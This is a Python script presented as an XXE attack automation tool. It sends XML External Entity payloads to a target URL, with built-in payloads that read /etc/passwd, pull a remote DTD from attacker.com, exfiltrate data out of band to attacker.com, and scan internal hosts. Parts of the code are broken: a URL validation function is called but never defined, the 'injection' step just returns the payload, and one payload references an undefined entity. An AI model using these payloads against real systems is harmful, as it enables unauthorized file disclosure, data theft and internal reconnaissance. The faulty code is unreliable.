import requests
from lxml import etree
import sys
import argparse
import threading
import time
import logging

# Set up logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Default XXE payload for Local File Inclusion (LFI)
DEFAULT_LFI_PAYLOAD = """
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
"""

# Default Remote File Inclusion (RFI) Payload
DEFAULT_RFI_PAYLOAD = """
<!DOCTYPE root [
<!ENTITY % file SYSTEM "http://attacker.com/malicious.dtd">
%file;
]>
<root>&xxe;</root>
"""

# Default Out-Of-Band (OOB) Data Exfiltration Payload
DEFAULT_OOB_PAYLOAD = """
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/exfiltrate">
%xxe;
]>
<root>&send;</root>
"""

# Default Internal Network Scanning Payload
INTERNAL_SCAN_PAYLOAD_TEMPLATE = """
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{internal_host}"> ]>
<root>&xxe;</root>
"""

# Sample XML to use if no external XML is provided
SAMPLE_XML = """
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>Sample content</data>
</root>
"""

# Function to read XML from file
def read_xml(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read()
    except FileNotFoundError:
        logging.error(f"Error: File '{file_path}' not found.")
        sys.exit(1)

# Function to read a custom payload from a file
def read_custom_payload(payload_file):
    try:
        with open(payload_file, 'r') as file:
            return file.read()
    except FileNotFoundError:
        logging.error(f"Error: Payload file '{payload_file}' not found.")
        sys.exit(1)

# Function to inject the appropriate XXE payload into the XML
def inject_xxe(xml_content, xxe_payload):
    try:
        # Parse the XML content
        parser = etree.XMLParser(resolve_entities=True)  # Enable entity resolution
        root = etree.fromstring(xml_content.encode(), parser=parser)
        # Inject XXE payload
        return xxe_payload
    except etree.XMLSyntaxError as e:
        logging.error(f"Error parsing XML: {e}")
        sys.exit(1)

# Function to send payload to the target URL
def send_xxe_payload(target_url, xml_payload):
    headers = {'Content-Type': 'application/xml'}
    try:
        # Send POST request with the XXE payload
        response = requests.post(target_url, data=xml_payload, headers=headers)
        return response.text
    except requests.RequestException as e:
        logging.error(f"Error sending request: {e}")
        sys.exit(1)

# Main function to execute different XXE attack types
def xxe_attack(target_url, xml_file=None, attack_type="lfi", custom_payload_file=None, internal_host=None):
    # Step 1: Validate the target URL
    if not is_valid_url(target_url):
        logging.error("Invalid URL format.")
        sys.exit(1)

    # Step 2: Read the XML content from file if provided, else use the sample XML
    if xml_file:
        original_xml = read_xml(xml_file)
    else:
        original_xml = SAMPLE_XML
    
    # Step 3: Select the XXE attack payload based on the chosen attack type and custom payload
    if custom_payload_file:
        xxe_payload = read_custom_payload(custom_payload_file)
        logging.info(f"Using custom XXE payload from file: {custom_payload_file}")
    else:
        # Default payloads for each attack type
        if attack_type == "lfi":
            logging.info("Using default Local File Inclusion (LFI) payload")
            xxe_payload = DEFAULT_LFI_PAYLOAD
        
        elif attack_type == "rfi":
            logging.info("Using default Remote File Inclusion (RFI) payload")
            xxe_payload = DEFAULT_RFI_PAYLOAD
        
        elif attack_type == "oob":
            logging.info("Using default Out-Of-Band (OOB) attack payload")
            xxe_payload = DEFAULT_OOB_PAYLOAD
        
        elif attack_type == "internal_scan":
            if not internal_host:
                logging.error("Internal scanning requires an internal host to scan.")
                sys.exit(1)
            logging.info(f"Using default Internal Network Scanning payload targeting {internal_host}")
            xxe_payload = INTERNAL_SCAN_PAYLOAD_TEMPLATE.format(internal_host=internal_host)
        
        else:
            logging.error("Invalid attack type. Choose from 'lfi', 'rfi', 'oob', or 'internal_scan'.")
            sys.exit(1)
    
    # Step 4: Inject the XXE payload into the XML
    xxe_payload_with_xml = inject_xxe(original_xml, xxe_payload)
    logging.info(f"Generated XXE Payload:\n{xxe_payload_with_xml}")
    
    # Step 5: Send the XXE payload to the target
    response = send_xxe_payload(target_url, xxe_payload_with_xml)
    
    # Step 6: Capture and print the response from the server
    logging.info("Response from target:")
    logging.info(response)

# Function to display colorful and blinking ASCII art
def display_blinking_ascii_art():
    ascii_art = """
▓█████ ▒██   ██▒ ▒█████    ██████  ▄████▄   ▄▄▄       ███▄    █ 
▓█   ▀ ▒▒ █ █ ▒░▒██▒  ██▒▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █ 
▒███   ░░  █   ░▒██░  ██▒░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒
▒▓█  ▄  ░ █ █ ▒ ▒██   ██░  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▒████▒▒██▒ ▒██▒░ ████▓▒░▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░
░░ ▒░ ░▒▒ ░ ░▓ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ░ ░  ░░░   ░▒ ░  ░ ▒ ▒░ ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░
   ░    ░    ░  ░ ░ ░ ▒  ░  ░  ░  ░          ░   ▒      ░   ░ ░ 
   ░  ░ ░    ░      ░ ░        ░  ░ ░            ░  ░         ░ 
                                  ░                              
    """
    while True:
        print(f"\033[5;31m{ascii_art}\033[0m")  # Blinking red text
        time.sleep(1)  # Adjust blink speed
        print("\033[0m")  # Reset color
        time.sleep(1)  # Adjust blink speed

if __name__ == "__main__":
    # Start the blinking ASCII art in a separate thread
    blinking_thread = threading.Thread(target=display_blinking_ascii_art, daemon=True)
    blinking_thread.start()

    parser = argparse.ArgumentParser(description='XXE Attack Automation Tool')
    parser.add_argument("-u", "--url", required=True, help="Target URL for the XXE attack")
    parser.add_argument("-x", "--xml_file", help="XML file to use for the attack.")
    parser.add_argument("-a", "--attack_type", choices=["lfi", "rfi", "oob", "internal_scan"], help="Type of XXE attack.")
    parser.add_argument("-p", "--payload_file", help="Custom payload file to use.")
    parser.add_argument("-ih", "--internal_host", help="Internal host to scan for internal attacks.")
    
    args = parser.parse_args()

    # Execute the XXE attack based on the provided arguments
    xxe_attack(args.url, args.xml_file, args.attack_type, args.payload_file, args.internal_host)

